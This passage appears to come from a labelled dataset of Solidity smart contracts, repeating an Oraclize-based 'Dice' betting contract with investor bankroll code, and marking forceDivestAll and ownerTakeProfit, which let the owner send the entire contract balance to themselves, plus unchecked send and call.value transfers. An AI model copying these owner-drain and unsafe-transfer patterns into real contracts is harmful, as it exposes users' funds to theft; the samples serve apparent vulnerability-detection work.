tx.gasprice*200000) return 0;\n return oraclize.query.value(price)(0, datasource, arg);\n }\n function oraclize_query(uint timestamp, string datasource, string arg) oraclizeAPI internal returns (bytes32 id){\n uint price = oraclize.getPrice(datasource);\n if (price > 1 ether + tx.gasprice*200000) return 0;\n return oraclize.query.value(price)(timestamp, datasource, arg);\n }\n function oraclize_query(uint timestamp, string datasource, string arg, uint gaslimit) oraclizeAPI internal returns (bytes32 id){\n uint price = oraclize.getPrice(datasource, gaslimit);\n if (price > 1 ether + tx.gasprice*gaslimit) return 0;\n return oraclize.query_withGasLimit.value(price)(timestamp, datasource, arg, gaslimit);\n }\n function oraclize_query(string datasource, string arg, uint gaslimit) oraclizeAPI internal returns (bytes32 id){\n uint price = oraclize.getPrice(datasource, gaslimit);\n if (price > 1 ether + tx.gasprice*gaslimit) return 0;\n return oraclize.query_withGasLimit.value(price)(0, datasource, arg, gaslimit);\n }\n function oraclize_query(string datasource, string arg1, string arg2) oraclizeAPI internal returns (bytes32 id){\n uint price = oraclize.getPrice(datasource);\n if (price > 1 ether + tx.gasprice*200000) return 0;\n return oraclize.query2.value(price)(0, datasource, arg1, arg2);\n }\n function oraclize_query(uint timestamp, string datasource, string arg1, string arg2) oraclizeAPI internal returns (bytes32 id){\n uint price = oraclize.getPrice(datasource);\n if (price > 1 ether + tx.gasprice*200000) return 0;\n return oraclize.query2.value(price)(timestamp, datasource, arg1, arg2);\n }\n function oraclize_query(uint timestamp, string datasource, string arg1, string arg2, uint gaslimit) oraclizeAPI internal returns (bytes32 id){\n uint price = oraclize.getPrice(datasource, gaslimit);\n if (price > 1 ether + tx.gasprice*gaslimit) return 0;\n return oraclize.query2_withGasLimit.value(price)(timestamp, datasource, arg1, arg2, gaslimit);\n }\n function oraclize_query(string datasource, string arg1, string arg2, uint gaslimit) oraclizeAPI internal returns (bytes32 id){\n uint price = oraclize.getPrice(datasource, gaslimit);\n if (price > 1 ether + tx.gasprice*gaslimit) return 0;\n return oraclize.query2_withGasLimit.value(price)(0, datasource, arg1, arg2, gaslimit);\n }\n function oraclize_cbAddress() oraclizeAPI internal returns (address){\n return oraclize.cbAddress();\n }\n function oraclize_setProof(byte proofP) oraclizeAPI internal {\n return oraclize.setProofType(proofP);\n }\n function getCodeSize(address _addr) constant internal returns(uint _size) {\n assembly {\n _size := extcodesize(_addr)\n }\n }\n function parseAddr(string _a) internal returns (address){\n bytes memory tmp = bytes(_a);\n uint160 iaddr = 0;\n uint160 b1;\n uint160 b2;\n for (uint i=2; i<2+2*20; i+=2){\n iaddr *= 256;\n b1 = uint160(tmp[i]);\n b2 = uint160(tmp[i+1]);\n if ((b1 >= 97)&&(b1 <= 102)) b1 -= 87;\n else if ((b1 >= 48)&&(b1 <= 57)) b1 -= 48;\n if ((b2 >= 97)&&(b2 <= 102)) b2 -= 87;\n else if ((b2 >= 48)&&(b2 <= 57)) b2 -= 48;\n iaddr += (b1*16+b2);\n }\n return address(iaddr);\n }\n function strCompare(string _a, string _b) internal returns (int) {\n bytes memory a = bytes(_a);\n bytes memory b = bytes(_b);\n uint minLength = a.length;\n if (b.length < minLength) minLength = b.length;\n for (uint i = 0; i < minLength; i ++)\n if (a[i] < b[i])\n return -1;\n else if (a[i] > b[i])\n return 1;\n if (a.length < b.length)\n return -1;\n else if (a.length > b.length)\n return 1;\n else\n return 0;\n }\n function indexOf(string _haystack, string _needle) internal returns (int)\n {\n bytes memory h = bytes(_haystack);\n bytes memory n = bytes(_needle);\n if(h.length < 1 || n.length < 1 || (n.length > h.length))\n return -1;\n else if(h.length > (2**128 -1))\n return -1;\n else\n {\n uint subindex = 0;\n for (uint i = 0; i < h.length; i ++)\n {\n if (h[i] == n[0])\n {\n subindex = 1;\n while(subindex < n.length && (i + subindex) < h.length && h[i + subindex] == n[subindex])\n {\n subindex++;\n }\n if(subindex == n.length)\n return int(i);\n }\n }\n return -1;\n }\n }\n function strConcat(string _a, string _b, string _c, string _d, string _e) internal returns (string){\n bytes memory _ba = bytes(_a);\n bytes memory _bb = bytes(_b);\n bytes memory _bc = bytes(_c);\n bytes memory _bd = bytes(_d);\n bytes memory _be = bytes(_e);\n string memory abcde = new string(_ba.length + _bb.length + _bc.length + _bd.length + _be.length);\n bytes memory babcde = bytes(abcde);\n uint k = 0;\n for (uint i = 0; i < _ba.length; i++) babcde[k++] = _ba[i];\n for (i = 0; i < _bb.length; i++) babcde[k++] = _bb[i];\n for (i = 0; i < _bc.length; i++) babcde[k++] = _bc[i];\n for (i = 0; i < _bd.length; i++) babcde[k++] = _bd[i];\n for (i = 0; i < _be.length; i++) babcde[k++] = _be[i];\n return string(babcde);\n }\n function strConcat(string _a, string _b, string _c, string _d) internal returns (string) {\n return strConcat(_a, _b, _c, _d, \"\");\n }\n function strConcat(string _a, string _b, string _c) internal returns (string) {\n return strConcat(_a, _b, _c, \"\", \"\");\n }\n function strConcat(string _a, string _b) internal returns (string) {\n return strConcat(_a, _b, \"\", \"\", \"\");\n }\n function parseInt(string _a) internal returns (uint) {\n return parseInt(_a, 0);\n }\n function parseInt(string _a, uint _b) internal returns (uint) {\n bytes memory bresult = bytes(_a);\n uint mint = 0;\n bool decimals = false;\n for (uint i=0; i<bresult.length; i++){\n if ((bresult[i] >= 48)&&(bresult[i] <= 57)){\n if (decimals){\n if (_b == 0) break;\n else _b--;\n }\n mint *= 10;\n mint += uint(bresult[i]) - 48;\n } else if (bresult[i] == 46) decimals = true;\n }\n return mint;\n }\n}\ncontract Dice is usingOraclize {\n uint public pwin = 5000;\n uint public edge = 200;\n uint public maxWin = 100;\n uint public minBet = 1 finney;\n uint public maxInvestors = 5;\n uint public ownerEdge = 50;\n uint public divestFee = 50;\n uint constant safeGas = 25000;\n uint constant oraclizeGasLimit = 150000;\n struct Investor {\n address user;\n uint capital;\n }\n mapping(uint => Investor) investors;\n uint public numInvestors = 0;\n mapping(address => uint) investorIDs;\n uint public invested = 0;\n address owner;\n bool public isStopped;\n struct Bet {\n address user;\n uint bet;\n uint roll;\n uint fee;\n }\n mapping (bytes32 => Bet) bets;\n bytes32[] betsKeys;\n uint public amountWagered = 0;\n int public profit = 0;\n int public takenProfit = 0;\n int public ownerProfit = 0;\n function Dice(uint pwinInitial, uint edgeInitial, uint maxWinInitial, uint minBetInitial, uint maxInvestorsInitial, uint ownerEdgeInitial, uint divestFeeInitial) {\n oraclize_setProof(proofType_TLSNotary | proofStorage_IPFS);\n pwin = pwinInitial;\n edge = edgeInitial;\n maxWin = maxWinInitial;\n minBet = minBetInitial;\n maxInvestors = maxInvestorsInitial;\n ownerEdge = ownerEdgeInitial;\n divestFee = divestFeeInitial;\n owner = msg.sender;\n }\n function() {\n bet();\n }\n function bet() {\n if (isStopped) throw;\n uint oraclizeFee = OraclizeI(OAR.getAddress()).getPrice(\"URL\", oraclizeGasLimit);\n if (msg.value < oraclizeFee) throw;\n uint betValue = msg.value - oraclizeFee;\n if ((((betValue * ((10000 - edge) - pwin)) / pwin ) <= (maxWin * getBankroll()) / 10000) && (betValue >= minBet)) {\n bytes32 myid = oraclize_query(\"URL\", \"json(https:\n bets[myid] = Bet(msg.sender, betValue, 0, oraclizeFee);\n betsKeys.push(myid);\n } else {\n throw;\n }\n }\n function numBets() constant returns(uint) {\n return betsKeys.length;\n }\n function minBetAmount() constant returns(uint) {\n uint oraclizeFee = OraclizeI(OAR.getAddress()).getPrice(\"URL\", oraclizeGasLimit);\n return oraclizeFee+minBet;\n }\n function safeSend(address addr, uint value) internal {\n if (!(addr.call.gas(safeGas).value(value)())){\n ownerProfit += int(value);\n }\n }\n function __callback(bytes32 myid, string result, bytes proof) {\n if (msg.sender != oraclize_cbAddress()) throw;\n Bet thisBet = bets[myid];\n if (thisBet.bet>0) {\n if ((isStopped == false)&&(((thisBet.bet * ((10000 - edge) - pwin)) / pwin ) <= maxWin * getBankroll() / 10000)) {\n uint roll = parseInt(result);\n if (roll<1 || roll>10000){\n safeSend(thisBet.user, thisBet.bet);\n return;\n }\n bets[myid].roll = roll;\n int profitDiff;\n if (roll-1 < pwin) {\n uint winAmount = (thisBet.bet * (10000 - edge)) / pwin;\n safeSend(thisBet.user, winAmount);\n profitDiff = int(thisBet.bet - winAmount);\n } else {\n safeSend(thisBet.user, 1);\n profitDiff = int(thisBet.bet) - 1;\n }\n ownerProfit += (profitDiff*int(ownerEdge))/10000;\n profit += profitDiff-(profitDiff*int(ownerEdge))/10000;\n amountWagered += thisBet.bet;\n } else {\n safeSend(thisBet.user, thisBet.bet);\n }\n }\n }\n function getBet(uint id) constant returns(address, uint, uint, uint) {\n if(id<betsKeys.length)\n {\n bytes32 betKey = betsKeys[id];\n return (bets[betKey].user, bets[betKey].bet, bets[betKey].roll, bets[betKey].fee);\n }\n }\n function invest() {\n if (isStopped) throw;\n if (investorIDs[msg.sender]>0) {\n rebalance();\n investors[investorIDs[msg.sender]].capital += msg.value;\n invested += msg.value;\n } else {\n rebalance();\n uint investorID = 0;\n if (numInvestors<maxInvestors) {\n investorID = ++numInvestors;\n } else {\n for (uint i=1; i<=numInvestors; i++) {\n if (investors[i].capital<msg.value && (investorID==0 || investors[i].capital<investors[investorID].capital)) {\n investorID = i;\n }\n }\n }\n if (investorID>0) {\n if (investors[investorID].capital>0) {\n divest(investors[investorID].user, investors[investorID].capital);\n investorIDs[investors[investorID].user] = 0;\n }\n if (investors[investorID].capital == 0 && investorIDs[investors[investorID].user] == 0) {\n investors[investorID].user = msg.sender;\n investors[investorID].capital = msg.value;\n invested += msg.value;\n investorIDs[msg.sender] = investorID;\n } else {\n throw;\n }\n } else {\n throw;\n }\n }\n }\n function rebalance() private {\n if (takenProfit != profit) {\n uint newInvested = 0;\n uint initialBankroll = getBankroll();\n for (uint i=1; i<=numInvestors; i++) {\n investors[i].capital = getBalance(investors[i].user);\n newInvested += investors[i].capital;\n }\n invested = newInvested;\n if (newInvested != initialBankroll && numInvestors>0) {\n ownerProfit += int(initialBankroll - newInvested);\n invested += (initialBankroll - newInvested);\n }\n takenProfit = profit;\n }\n }\n function divest(address user, uint amount) private {\n if (investorIDs[user]>0) {\n rebalance();\n if (amount>getBalance(user)) {\n amount = getBalance(user);\n }\n investors[investorIDs[user]].capital -= amount;\n invested -= amount;\n uint newAmount = (amount*divestFee)/10000;\n ownerProfit += int(newAmount);\n safeSend(user, (amount-newAmount));\n }\n }\n function divest(uint amount) {\n if (msg.value>0) throw;\n divest(msg.sender, amount);\n }\n function divest() {\n if (msg.value>0) throw;\n divest(msg.sender, getBalance(msg.sender));\n }\n function getBalance(address user) constant returns(uint) {\n if (investorIDs[user]>0 && invested>0) {\n return investors[investorIDs[user]].capital * getBankroll() / invested;\n } else {\n return 0;\n }\n }\n function getBankroll() constant returns(uint) {\n uint bankroll = uint(int(invested)+profit+ownerProfit-takenProfit);\n if (this.balance < bankroll){\n log0(\"bankroll_mismatch\");\n bankroll = this.balance;\n }\n return bankroll;\n }\n function getMinInvestment() constant returns(uint) {\n if (numInvestors<maxInvestors) {\n return 0;\n } else {\n uint investorID;\n for (uint i=1; i<=numInvestors; i++) {\n if (investorID==0 || getBalance(investors[i].user)<getBalance(investors[investorID].user)) {\n investorID = i;\n }\n }\n return getBalance(investors[investorID].user);\n }\n }\n function getStatus() constant returns(uint, uint, uint, uint, uint, uint, int, uint, uint) {\n return (getBankroll(), pwin, edge, maxWin, minBet, amountWagered, profit, getMinInvestment(), betsKeys.length);\n }\n function stopContract() {\n if (owner != msg.sender) throw;\n isStopped = true;\n }\n function resumeContract() {\n if (owner != msg.sender) throw;\n isStopped = false;\n }\n function forceDivestAll() {\n forceDivestAll(false);\n }\n function forceDivestAll(bool ownerTakeChangeAndProfit) {\n if (owner != msg.sender) throw;\n for (uint investorID=1; investorID<=numInvestors; investorID++) {\n divest(investors[investorID].user, getBalance(investors[investorID].user));\n }\n if (ownerTakeChangeAndProfit) owner.send(this.balance);\n }\n function ownerTakeProfit() {\n ownerTakeProfit(false);\n }\n function ownerTakeProfit(bool takeChange) {\n if (owner != msg.sender) throw;\n if (takeChange){\n uint investorsCapital = 0;\n for (uint i=1; i<=numInvestors; i++) {\n investorsCapital += investors[i].capital;\n }\n if ((investorsCapital == 0)&&(this.balance != uint(ownerProfit))){\n owner.send(this.balance);\n ownerProfit = 0;\n }\n } else {\n owner.send(uint(ownerProfit));\n ownerProfit = 0;\n }\n }\n}",
  "extract_feature": [
    "function forceDivestAll(bool ownerTakeChangeAndProfit) {\nif (owner != msg.sender) throw;\nfor (uint investorID=1; investorID<=numInvestors; investorID++) {\ndivest(investors[investorID].user, getBalance(investors[investorID].user));\n}\nif (ownerTakeChangeAndProfit) owner.send(this.balance);\n}",
    "function ownerTakeProfit(bool takeChange) {\nif (owner != msg.sender) throw;\nif (takeChange){\nuint investorsCapital = 0;\nfor (uint i=1; i<=numInvestors; i++) {\ninvestorsCapital += investors[i].capital;\n}\nif ((investorsCapital == 0)&&(this.balance != uint(ownerProfit))){\nowner.send(this.balance);\nownerProfit = 0;\n}\n} else {\nowner.send(uint(ownerProfit));\nownerProfit = 0;\n}\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db7fcb296bdecdb163d"
  },
  "filename": "40460.sol",
  "content": "contract OraclizeI {\n address public cbAddress;\n function query(uint _timestamp, string _datasource, string _arg) returns (bytes32 _id);\n function query_withGasLimit(uint _timestamp, string _datasource, string _arg, uint _gaslimit) returns (bytes32 _id);\n function query2(uint _timestamp, string _datasource, string _arg1, string _arg2) returns (bytes32 _id);\n function query2_withGasLimit(uint _timestamp, string _datasource, string _arg1, string _arg2, uint _gaslimit) returns (bytes32 _id);\n function getPrice(string _datasource) returns (uint _dsprice);\n function getPrice(string _datasource, uint gaslimit) returns (uint _dsprice);\n function useCoupon(string _coupon);\n function setProofType(byte _proofType);\n}\ncontract OraclizeAddrResolverI {\n function getAddress() returns (address _addr);\n}\ncontract usingOraclize {\n uint constant day = 60*60*24;\n uint constant week = 60*60*24*7;\n uint constant month = 60*60*24*30;\n byte constant proofType_NONE = 0x00;\n byte constant proofType_TLSNotary = 0x10;\n byte constant proofStorage_IPFS = 0x01;\n uint8 constant networkID_auto = 0;\n uint8 constant networkID_mainnet = 1;\n uint8 constant networkID_testnet = 2;\n uint8 constant networkID_morden = 2;\n uint8 constant networkID_consensys = 161;\n OraclizeAddrResolverI OAR;\n OraclizeI oraclize;\n modifier oraclizeAPI {\n address oraclizeAddr = OAR.getAddress();\n if (oraclizeAddr == 0){\n oraclize_setNetwork(networkID_auto);\n oraclizeAddr = OAR.getAddress();\n }\n oraclize = OraclizeI(oraclizeAddr);\n _\n }\n modifier coupon(string code){\n oraclize = OraclizeI(OAR.getAddress());\n oraclize.useCoupon(code);\n _\n }\n function oraclize_setNetwork(uint8 networkID) internal returns(bool){\n if (getCodeSize(0x1d3b2638a7cc9f2cb3d298a3da7a90b67e5506ed)>0){\n OAR = OraclizeAddrResolverI(0x1d3b2638a7cc9f2cb3d298a3da7a90b67e5506ed);\n return true;\n }\n if (getCodeSize(0x9efbea6358bed926b293d2ce63a730d6d98d43dd)>0){\n OAR = OraclizeAddrResolverI(0x9efbea6358bed926b293d2ce63a730d6d98d43dd);\n return true;\n }\n if (getCodeSize(0x20e12a1f859b3feae5fb2a0a32c18f5a65555bbf)>0){\n OAR = OraclizeAddrResolverI(0x20e12a1f859b3feae5fb2a0a32c18f5a65555bbf);\n return true;\n }\n return false;\n }\n function oraclize_query(string datasource, string arg) oraclizeAPI internal returns (bytes32 id){\n uint price = oraclize.getPrice(datasource);\n if (price > 1 ether + tx.gasprice*200000) return 0;\n return oraclize.query.value(price)(0, datasource, arg);\n }\n function oraclize_query(uint timestamp, string datasource, string arg) oraclizeAPI internal returns (bytes32 id){\n uint price = oraclize.getPrice(datasource);\n if (price > 1 ether + tx.gasprice*200000) return 0;\n return oraclize.query.value(price)(timestamp, datasource, arg);\n }\n function oraclize_query(uint timestamp, string datasource, string arg, uint gaslimit) oraclizeAPI internal returns (bytes32 id){\n uint price = oraclize.getPrice(datasource, gaslimit);\n if (price > 1 ether + tx.gasprice*gaslimit) return 0;\n return oraclize.query_withGasLimit.value(price)(timestamp, datasource, arg, gaslimit);\n }\n function oraclize_query(string datasource, string arg, uint gaslimit) oraclizeAPI internal returns (bytes32 id){\n uint price = oraclize.getPrice(datasource, gaslimit);\n if (price > 1 ether + tx.gasprice*gaslimit) return 0;\n return oraclize.query_withGasLimit.value(price)(0, datasource, arg, gaslimit);\n }\n function oraclize_query(string datasource, string arg1, string arg2) oraclizeAPI internal returns (bytes32 id){\n uint price = oraclize.getPrice(datasource);\n if (price > 1 ether + tx.gasprice*200000) return 0;\n return oraclize.query2.value(price)(0, datasource, arg1, arg2);\n }\n function oraclize_query(uint timestamp, string datasource, string arg1, string arg2) oraclizeAPI internal returns (bytes32 id){\n uint price = oraclize.getPrice(datasource);\n if (price > 1 ether + tx.gasprice*200000) return 0;\n return oraclize.query2.value(price)(timestamp, datasource, arg1, arg2);\n }\n function oraclize_query(uint timestamp, string datasource, string arg1, string arg2, uint gaslimit) oraclizeAPI internal returns (bytes32 id){\n uint price = oraclize.getPrice(datasource, gaslimit);\n if (price > 1 ether + tx.gasprice*gaslimit) return 0;\n return oraclize.query2_withGasLimit.value(price)(timestamp, datasource, arg1, arg2, gaslimit);\n }\n function oraclize_query(string datasource, string arg1, string arg2, uint gaslimit) oraclizeAPI internal returns (bytes32 id){\n uint price = oraclize.getPrice(datasource, gaslimit);\n if (price > 1 ether + tx.gasprice*gaslimit) return 0;\n return oraclize.query2_withGasLimit.value(price)(0, datasource, arg1, arg2, gaslimit);\n }\n function oraclize_cbAddress() oraclizeAPI internal returns (address){\n return oraclize.cbAddress();\n }\n function oraclize_setProof(byte proofP) oraclizeAPI internal {\n return oraclize.setProofType(proofP);\n }\n function getCodeSize(address _addr) constant internal returns(uint _size) {\n assembly {\n _size := extcodesize(_addr)\n }\n }\n function parseAddr(string _a) internal returns (address){\n bytes memory tmp = bytes(_a);\n uint160 iaddr = 0;\n uint160 b1;\n uint160 b2;\n for (uint i=2; i<2+2*20; i+=2){\n iaddr *= 256;\n b1 = uint160(tmp[i]);\n b2 = uint160(tmp[i+1]);\n if ((b1 >= 97)&&(b1 <= 102)) b1 -= 87;\n else if ((b1 >= 48)&&(b1 <= 57)) b1 -= 48;\n if ((b2 >= 97)&&(b2 <= 102)) b2 -= 87;\n else if ((b2 >= 48)&&(b2 <= 57)) b2 -= 48;\n iaddr += (b1*16+b2);\n }\n return address(iaddr);\n }\n function strCompare(string _a, string _b) internal returns (int) {\n bytes memory a = bytes(_a);\n bytes memory b = bytes(_b);\n uint minLength = a.length;\n if (b.length < minLength) minLength = b.length;\n for (uint i = 0; i < minLength; i ++)\n if (a[i] < b[i])\n return -1;\n else if (a[i] > b[i])\n return 1;\n if (a.length < b.length)\n return -1;\n else if (a.length > b.length)\n return 1;\n else\n return 0;\n }\n function indexOf(string _haystack, string _needle) internal returns (int)\n {\n bytes memory h = bytes(_haystack);\n bytes memory n = bytes(_needle);\n if(h.length < 1 || n.length < 1 || (n.length > h.length))\n return -1;\n else if(h.length > (2**128 -1))\n return -1;\n else\n {\n uint subindex = 0;\n for (uint i = 0; i < h.length; i ++)\n {\n if (h[i] == n[0])\n {\n subindex = 1;\n while(subindex < n.length && (i + subindex) < h.length && h[i + subindex] == n[subindex])\n {\n subindex++;\n }\n if(subindex == n.length)\n return int(i);\n }\n }\n return -1;\n }\n }\n function strConcat(string _a, string _b, string _c, string _d, string _e) internal returns (string){\n bytes memory _ba = bytes(_a);\n bytes memory _bb = bytes(_b);\n bytes memory _bc = bytes(_c);\n bytes memory _bd = bytes(_d);\n bytes memory _be = bytes(_e);\n string memory abcde = new string(_ba.length + _bb.length + _bc.length + _bd.length + _be.length);\n bytes memory babcde = bytes(abcde);\n uint k = 0;\n for (uint i = 0; i < _ba.length; i++) babcde[k++] = _ba[i];\n for (i = 0; i < _bb.length; i++) babcde[k++] = _bb[i];\n for (i = 0; i < _bc.length; i++) babcde[k++] = _bc[i];\n for (i = 0; i < _bd.length; i++) babcde[k++] = _bd[i];\n for (i = 0; i < _be.length; i++) babcde[k++] = _be[i];\n return string(babcde);\n }\n function strConcat(string _a, string _b, string _c, string _d) internal returns (string) {\n return strConcat(_a, _b, _c, _d, \"\");\n }\n function strConcat(string _a, string _b, string _c) internal returns (string) {\n return strConcat(_a, _b, _c, \"\", \"\");\n }\n function strConcat(string _a, string _b) internal returns (string) {\n return strConcat(_a, _b, \"\", \"\", \"\");\n }\n function parseInt(string _a) internal returns (uint) {\n return parseInt(_a, 0);\n }\n function parseInt(string _a, uint _b) internal returns (uint) {\n bytes memory bresult = bytes(_a);\n uint mint = 0;\n bool decimals = false;\n for (uint i=0; i<bresult.length; i++){\n if ((bresult[i] >= 48)&&(bresult[i] <= 57)){\n if (decimals){\n if (_b == 0) break;\n else _b--;\n }\n mint *= 10;\n mint += uint(bresult[i]) - 48;\n } else if (bresult[i] == 46) decimals = true;\n }\n return mint;\n }\n}\ncontract Dice is usingOraclize {\n uint public pwin = 5000;\n uint public edge = 200;\n uint public maxWin = 100;\n uint public minBet = 1 finney;\n uint public maxInvestors = 5;\n uint public ownerEdge = 50;\n uint public divestFee = 50;\n uint constant safeGas = 25000;\n uint constant oraclizeGasLimit = 150000;\n struct Investor {\n address user;\n uint capital;\n }\n mapping(uint => Investor) investors;\n uint public numInvestors = 0;\n mapping(address => uint) investorIDs;\n uint public invested = 0;\n address owner;\n bool public isStopped;\n struct Bet {\n address user;\n uint bet;\n uint roll;\n uint fee;\n }\n mapping (bytes32 => Bet) bets;\n bytes32[] betsKeys;\n uint public amountWagered = 0;\n int public profit = 0;\n int public takenProfit = 0;\n int public ownerProfit = 0;\n function Dice(uint pwinInitial, uint edgeInitial, uint maxWinInitial, uint minBetInitial, uint maxInvestorsInitial, uint ownerEdgeInitial, uint divestFeeInitial) {\n oraclize_setProof(proofType_TLSNotary | proofStorage_IPFS);\n pwin = pwinInitial;\n edge = edgeInitial;\n maxWin = maxWinInitial;\n minBet = minBetInitial;\n maxInvestors = maxInvestorsInitial;\n ownerEdge = ownerEdgeInitial;\n divestFee = divestFeeInitial;\n owner = msg.sender;\n }\n function() {\n bet();\n }\n function bet() {\n if (isStopped) throw;\n uint oraclizeFee = OraclizeI(OAR.getAddress()).getPrice(\"URL\", oraclizeGasLimit);\n if (msg.value < oraclizeFee) throw;\n uint betValue = msg.value - oraclizeFee;\n if ((((betValue * ((10000 - edge) - pwin)) / pwin ) <= (maxWin * getBankroll()) / 10000) && (betValue >= minBet)) {\n bytes32 myid = oraclize_query(\"URL\", \"json(https:\n bets[myid] = Bet(msg.sender, betValue, 0, oraclizeFee);\n betsKeys.push(myid);\n } else {\n throw;\n }\n }\n function numBets() constant returns(uint) {\n return betsKeys.length;\n }\n function minBetAmount() constant returns(uint) {\n uint oraclizeFee = OraclizeI(OAR.getAddress()).getPrice(\"URL\", oraclizeGasLimit);\n return oraclizeFee+minBet;\n }\n function safeSend(address addr, uint value) internal {\n if (!(addr.call.gas(safeGas).value(value)())){\n ownerProfit += int(value);\n }\n }\n function __callback(bytes32 myid, string result, bytes proof) {\n if (msg.sender != oraclize_cbAddress()) throw;\n Bet thisBet = bets[myid];\n if (thisBet.bet>0) {\n if ((isStopped == false)&&(((thisBet.bet * ((10000 - edge) - pwin)) / pwin ) <= maxWin * getBankroll() / 10000)) {\n uint roll = parseInt(result);\n if (roll<1 || roll>10000){\n safeSend(thisBet.user, thisBet.bet);\n return;\n }\n bets[myid].roll = roll;\n int profitDiff;\n if (roll-1 < pwin) {\n uint winAmount = (thisBet.bet * (10000 - edge)) / pwin;\n safeSend(thisBet.user, winAmount);\n profitDiff = int(thisBet.bet - winAmount);\n } else {\n safeSend(thisBet.user, 1);\n profitDiff = int(thisBet.bet) - 1;\n }\n ownerProfit += (profitDiff*int(ownerEdge))/10000;\n profit += profitDiff-(profitDiff*int(ownerEdge))/10000;\n amountWagered += thisBet.bet;\n } else {\n safeSend(thisBet.user, thisBet.bet);\n }\n }\n }\n function getBet(uint id) constant returns(address, uint, uint, uint) {\n if(id<betsKeys.length)\n {\n bytes32 betKey = betsKeys[id];\n return (bets[betKey].user, bets[betKey].bet, bets[betKey].roll, bets[betKey].fee);\n }\n }\n function invest() {\n if (isStopped) throw;\n if (investorIDs[msg.sender]>0) {\n rebalance();\n investors[investorIDs[msg.sender]].capital += msg.value;\n invested += msg.value;\n } else {\n rebalance();\n uint investorID = 0;\n if (numInvestors<maxInvestors) {\n investorID = ++numInvestors;\n } else {\n for (uint i=1; i<=numInvestors; i++) {\n if (investors[i].capital<msg.value && (investorID==0 || investors[i].capital<investors[investorID].capital)) {\n investorID = i;\n }\n }\n }\n if (investorID>0) {\n if (investors[investorID].capital>0) {\n divest(investors[investorID].user, investors[investorID].capital);\n investorIDs[investors[investorID].user] = 0;\n }\n if (investors[investorID].capital == 0 && investorIDs[investors[investorID].user] == 0) {\n investors[investorID].user = msg.sender;\n investors[investorID].capital = msg.value;\n invested += msg.value;\n investorIDs[msg.sender] = investorID;\n } else {\n throw;\n }\n } else {\n throw;\n }\n }\n }\n function rebalance() private {\n if (takenProfit != profit) {\n uint newInvested = 0;\n uint initialBankroll = getBankroll();\n for (uint i=1; i<=numInvestors; i++) {\n investors[i].capital = getBalance(investors[i].user);\n newInvested += investors[i].capital;\n }\n invested = newInvested;\n if (newInvested != initialBankroll && numInvestors>0) {\n ownerProfit += int(initialBankroll - newInvested);\n invested += (initialBankroll - newInvested);\n }\n takenProfit = profit;\n }\n }\n function divest(address user, uint amount) private {\n if (investorIDs[user]>0) {\n rebalance();\n if (amount>getBalance(user)) {\n amount = getBalance(user);\n }\n investors[investorIDs[user]].capital -= amount;\n invested -= amount;\n uint newAmount = (amount*divestFee)/10000;\n ownerProfit += int(newAmount);\n safeSend(user, (amount-newAmount));\n }\n }\n function divest(uint amount) {\n if (msg.value>0) throw;\n divest(msg.sender, amount);\n }\n function divest() {\n if (msg.value>0) throw;\n divest(msg.sender, getBalance(msg.sender));\n }\n function getBalance(address user) constant returns(uint) {\n if (investorIDs[user]>0 && invested>0) {\n return investors[investorIDs[user]].capital * getBankroll() / invested;\n } else {\n return 0;\n }\n }\n function getBankroll() constant returns(uint) {\n uint bankroll = uint(int(invested)+profit+ownerProfit-takenProfit);\n if (this.balance < bankroll){\n log0(\"bankroll_mismatch\");\n bankroll = this.balance;\n }\n return bankroll;\n }\n function getMinInvestment() constant returns(uint) {\n if (numInvestors<maxInvestors) {\n return 0;\n } else {\n uint investorID;\n for (uint i=1; i<=numInvestors; i++) {\n if (investorID==0 || getBalance(investors[i].user)<getBalance(investors[investorID].user)) {\n investorID = i;\n }\n }\n return getBalance(investors[investorID].user);\n }\n }\n function getStatus() constant returns(uint, uint, uint, uint, uint, uint, int, uint, uint) {\n return (getBankroll(), pwin, edge, maxWin, minBet, amountWagered, profit, getMinInvestment(), betsKeys.length);\n }\n function stopContract() {\n if (owner != msg.sender) throw;\n isStopped = true;\n }\n function resumeContract() {\n if (owner != msg.sender) throw;\n isStopped = false;\n }\n function forceDivestAll() {\n forceDivestAll(false);\n }\n function forceDivestAll(bool ownerTakeChangeAndProfit) {\n if (owner != msg.sender) throw;\n for (uint investorID=1; investorID<=numInvestors; investorID++) {\n divest(investors[investorID].user, getBalance(investors[investorID].user));\n }\n if (ownerTakeChangeAndProfit) owner.send(this.balance);\n }\n function ownerTakeProfit() {\n ownerTakeProfit(false);\n }\n function ownerTakeProfit(bool takeChange) {\n if (owner != msg.sender) throw;\n if (takeChange){\n uint investorsCapital = 0;\n for (uint i=1; i<=numInvestors; i++) {\n investorsCapital += investors[i].capital;\n }\n if ((investorsCapital == 0)&&(this.balance != uint(ownerProfit))){\n owner.send(this.balance);\n ownerProfit = 0;\n }\n } else {\n owner.send(uint(ownerProfit));\n ownerProfit = 0;\n }\n }\n}",
  "extract_feature": [
    "function forceDivestAll(bool ownerTakeChangeAndProfit) {\nif (owner != msg.sender) throw;\nfor (uint investorID=1; investorID<=numInvestors; investorID++) {\ndivest(investors[investorID].user, getBalance(investors[investorID].user));\n}\nif (ownerTakeChangeAndProfit) owner.send(this.balance);\n}",
    "function ownerTakeProfit(bool takeChange) {\nif (owner != msg.sender) throw;\nif (takeChange){\nuint investorsCapital = 0;\nfor (uint i=1; i<=numInvestors; i++) {\ninvestorsCapital += investors[i].capital;\n}\nif ((investorsCapital == 0)&&(this.balance != uint(ownerProfit))){\nowner.send(this.balance);\nownerProfit = 0;\n}\n} else {\nowner.send(uint(ownerProfit));\nownerProfit = 0;\n}\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db7fcb296bdecdb163e"
  },
  "filename": "40461.sol",
  "content": "contract OraclizeI {\n address public cbAddress;\n function query(uint _timestamp, string _datasource, string _arg) returns (bytes32 _id);\n function query_withGasLimit(uint _timestamp, string _datasource, string _arg, uint _gaslimit) returns (bytes32 _id);\n function query2(uint _timestamp, string _datasource, string _arg1, string _arg2) returns (bytes32 _id);\n function query2_withGasLimit(uint _timestamp, string _datasource, string _arg1, string _arg2, uint _gaslimit) returns (bytes32 _id);\n function getPrice(string _datasource) returns (uint _dsprice);\n function getPrice(string _datasource, uint gaslimit) returns (uint _dsprice);\n function useCoupon(string _coupon);\n function setProofType(byte _proofType);\n}\ncontract OraclizeAddrResolverI {\n function getAddress() returns (address _addr);\n}\ncontract usingOraclize {\n uint constant day = 60*60*24;\n uint constant week = 60*60*24*7;\n uint constant month = 60*60*24*30;\n byte constant proofType_NONE = 0x00;\n byte constant proofType_TLSNotary = 0x10;\n byte constant proofStorage_IPFS = 0x01;\n uint8 constant networkID_auto = 0;\n uint8 constant 